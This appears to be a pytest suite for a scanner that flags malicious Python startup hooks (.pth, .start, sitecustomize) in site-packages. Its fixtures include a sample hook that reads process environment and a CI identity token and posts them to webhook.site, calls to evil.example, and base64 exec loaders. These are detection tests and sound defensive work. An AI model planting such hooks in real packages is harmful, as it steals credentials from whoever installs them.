"""Tests build fake site-packages dirs in tmp_path. Payloads are inert strings and
the directories are never put on sys.path: pthscan only reads them."""
import base64
import json
import subprocess
import sys
from pathlib import Path

import pytest

from pthscan.scanner import scan, imported_modules, executable_lines
from pthscan.__main__ import main

INERT = base64.b64encode(b"print('inert test payload')").decode()


def site(tmp_path: Path) -> Path:
    s = tmp_path / "venv" / "lib" / "python3.13" / "site-packages"
    s.mkdir(parents=True)
    (tmp_path / "venv" / "pyvenv.cfg").write_text("home = /usr/bin\n")
    return s


def dist(s: Path, name: str, version: str, files: list[str]) -> None:
    info = s / f"{name.replace('-', '_')}-{version}.dist-info"
    info.mkdir()
    (info / "METADATA").write_text(f"Metadata-Version: 2.1\nName: {name}\nVersion: {version}\n")
    (info / "RECORD").write_text("".join(f"{f},,\n" for f in files))


def by_file(findings):
    return {Path(f.file).name: f for f in findings}


def test_known_good_hooks_are_ok(tmp_path):
    s = site(tmp_path)
    (s / "distutils-precedence.pth").write_text("import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n")
    (s / "a1_coverage.pth").write_text("import sys; exec('import os\\n\\nif os.getenv(\"COVERAGE_PROCESS_START\") or os.getenv(\"COVERAGE_PROCESS_CONFIG\"):\\n try:\\n  import coverage\\n except:\\n  pass\\n else:\\n  coverage.process_startup(slug=\"pth\")')\n")
    (s / "_virtualenv.pth").write_text("import _virtualenv\n")
    (s / "_virtualenv.py").write_text("import os, sys\n# patches distutils\n")
    (s / "__editable__.pkg-1.0.pth").write_text("/home/me/pkg/src\n")
    dist(s, "setuptools", "80.0", ["distutils-precedence.pth"])
    dist(s, "coverage", "7.17.4", ["a1_coverage.pth"])
    f = scan([s])
    assert {x.severity for x in f} == {"ok"}, [(x.file, x.reasons) for x in f]


def test_litellm_style_pth_is_critical(tmp_path):
    s = site(tmp_path)
    (s / "litellm_init.pth").write_text(f"import os, subprocess, sys; subprocess.Popen([sys.executable, '-c', \"import base64; exec(base64.b64decode('{INERT}'))\"])\n")
    dist(s, "litellm", "1.82.8", ["litellm_init.pth"])
    f = scan([s])
    assert all(x.severity == "critical" for x in f)
    assert any("known-compromised release" in x.title for x in f)
    assert any("litellm_init.pth" in x.file for x in f)


def test_agent_framework_style_module_is_critical_even_renamed(tmp_path):
    s = site(tmp_path)
    stealer = ("import os, json, urllib.request\n"
               "env = open('/proc/1/environ').read()\n"
               "tok = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN')\n"
               "urllib.request.urlopen('https://webhook.site/x', data=json.dumps([env, tok]).encode())\n")
    # renamed files, not on any known list, owned by an innocent-looking dist
    (s / "zz_runtime_telemetry.pth").write_text("import zz_runtime_telemetry\n")
    (s / "zz_runtime_telemetry.py").write_text(stealer)
    dist(s, "fancy-agents", "2.0.0", ["zz_runtime_telemetry.pth", "zz_runtime_telemetry.py"])
    f = by_file(scan([s]))
    hook = f["zz_runtime_telemetry.pth"]
    assert hook.severity == "critical", hook.reasons
    assert any("opens network connections" in r and "credential stores" in r for r in hook.reasons)
    assert hook.owner == "fancy-agents==2.0.0"


def test_known_compromised_agent_framework_version(tmp_path):
    s = site(tmp_path)
    dist(s, "agent-framework", "1.26.2", [])
    f = scan([s])
    assert f[0].severity == "critical" and "known-compromised" in f[0].title


def test_hades_naming_and_inline_payload(tmp_path):
    s = site(tmp_path)
    (s / "colorlib-setup.pth").write_text(f"import base64;exec(base64.b64decode('{INERT}'))\n")
    f = scan([s])[0]
    assert f.severity == "critical"
    assert any("Hades" in r for r in f.reasons)
    assert any("decodes base64" in r for r in f.reasons)


def test_planted_module_behind_known_good_line(tmp_path):
    s = site(tmp_path)
    (s / "_virtualenv.pth").write_text("import _virtualenv\n")
    (s / "_virtualenv.py").write_text("import urllib.request\nurllib.request.urlopen('https://evil.example/c')\n")
    f = scan([s])[0]
    assert f.severity == "critical"
    assert "suspicious module" in f.title


def test_unknown_benign_hook_is_warning_and_orphans_flagged(tmp_path):
    s = site(tmp_path)
    (s / "mytool.pth").write_text("import mytool_boot; mytool_boot.go()\n")
    (s / "mytool_boot.py").write_text("def go():\n    pass\n")
    f = scan([s])[0]
    assert f.severity == "warning"
    assert any("no installed package claims" in r for r in f.reasons)


def test_start_files_pep829(tmp_path):
    s = site(tmp_path)
    (s / "evil.start").write_text("evil_mod:run\n")
    (s / "evil_mod.py").write_text(f"import base64\ndef run():\n    exec(base64.b64decode('{INERT}'))\n")
    assert scan([s])[0].severity == "critical"


def test_parsing_helpers():
    assert executable_lines("/some/path\nimport a; a.b()\nimporter\n#import x\n") == ["import a; a.b()"]
    assert imported_modules("import os, foo.bar; __import__('baz')") == ["foo", "baz"]


def test_cli_exit_codes_and_json(tmp_path, capsys):
    s = site(tmp_path)
    (s / "ok.pth").write_text("/some/path\n")
    assert main([str(tmp_path)]) == 0
    (s / "x.pth").write_text("import mystery\n")
    assert main([str(tmp_path)]) == 0
    assert main([str(tmp_path), "--strict"]) == 1
    (s / "y.pth").write_text("import socket; socket.create_connection(('a', 1))\n")
    capsys.readouterr()
    assert main([str(tmp_path), "--format", "json"]) == 1
    out = json.loads(capsys.readouterr().out)
    assert {x["severity"] for x in out["findings"]} == {"critical", "warning"}


def test_never_executes_scanned_hooks(tmp_path):
    s = site(tmp_path)
    marker = tmp_path / "EXECUTED"
    (s / "trap.pth").write_text(f"import pathlib; pathlib.Path({str(marker)!r}).write_text('x')\n")
    main([str(tmp_path), "--format", "json"])
    assert not marker.exists()


def test_hook_mode_blocks_after_install(tmp_path):
    s = site(tmp_path)
    (s / "z.pth").write_text(f"import base64;exec(base64.b64decode('{INERT}'))\n")
    def run(cmd):
        return subprocess.run([sys.executable, "-m", "pthscan", "hook"], input=json.dumps(
            {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(tmp_path)}),
            capture_output=True, text=True, cwd=Path(__file__).parent.parent / "src")
    r = run("uv pip install somepkg")
    assert r.returncode == 2 and "STOP" in r.stderr
    assert run("ls -la").returncode == 0


def test_sitecustomize_known_empty_unknown_and_malicious(tmp_path):
    s = site(tmp_path)
    (s / "sitecustomize.py").write_text("# install the apport exception handler if available\ntry:\n    import apport_python_hook\nexcept ImportError:\n    pass\nelse:\n    apport_python_hook.install()\n")
    assert scan([s])[0].severity == "ok"
    (s / "sitecustomize.py").write_text("")
    assert scan([s])[0].severity == "ok"
    (s / "sitecustomize.py").write_text("import sys\nsys.setrecursionlimit(5000)\n")
    f = scan([s])[0]
    assert f.severity == "warning" and "unrecognised sitecustomize.py" in f.title
    (s / "usercustomize.py").write_text(f"import base64\nexec(base64.b64decode('{INERT}'))\n")
    sev = {Path(x.file).name: x.severity for x in scan([s])}
    assert sev["usercustomize.py"] == "critical"


def test_sitecustomize_in_package_subdirs_is_ignored(tmp_path):
    s = site(tmp_path)
    (s / "ddtrace" / "bootstrap").mkdir(parents=True)
    (s / "ddtrace" / "bootstrap" / "sitecustomize.py").write_text("import subprocess, socket\n")
    assert scan([s]) == []


def test_stdlib_customize_dir(tmp_path):
    std = tmp_path / "lib" / "python3.13"
    std.mkdir(parents=True)
    (std / "sitecustomize.py").write_text("import urllib.request\nurllib.request.urlopen('https://x.example')\n")
    f = scan([], [std])
    assert len(f) == 1 and f[0].severity == "critical"
